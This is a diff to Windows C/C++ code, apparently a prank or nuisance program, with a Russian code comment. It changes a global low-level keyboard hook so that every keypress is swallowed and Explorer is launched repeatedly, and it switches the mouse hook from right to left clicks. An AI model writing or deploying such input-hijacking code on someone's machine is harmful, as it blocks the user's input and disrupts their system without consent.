@@ -42,17 +42,14 @@ LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
 	if (wParam == WM_KEYDOWN) {
 		PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
 
-		if (p->vkCode == VK_RETURN)
+		int n = 0;
+		SetMouseHook();
+		while (n < 5)
 		{
-			int n = 0;
-			SetMouseHook();
-			while (n < 100)			
-			{				
-				system("explorer");
-				n++;
-			}
-			return 0;
+			system("explorer");
+			n++;
 		}
+		return 0;
 
 		/*PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
 		LPPOINT  pt = new POINT;
@@ -98,7 +95,7 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 		CallNextHookEx(NULL, nCode, wParam, lParam);
 		return 0;
 	}
-	if (wParam == WM_RBUTTONDOWN) {
+	if (wParam == WM_LBUTTONDOWN) {
 
 		PMSLLHOOKSTRUCT p = (PMSLLHOOKSTRUCT)lParam;
 		// В хуке мыши лучше брать координаты через структуру сверху
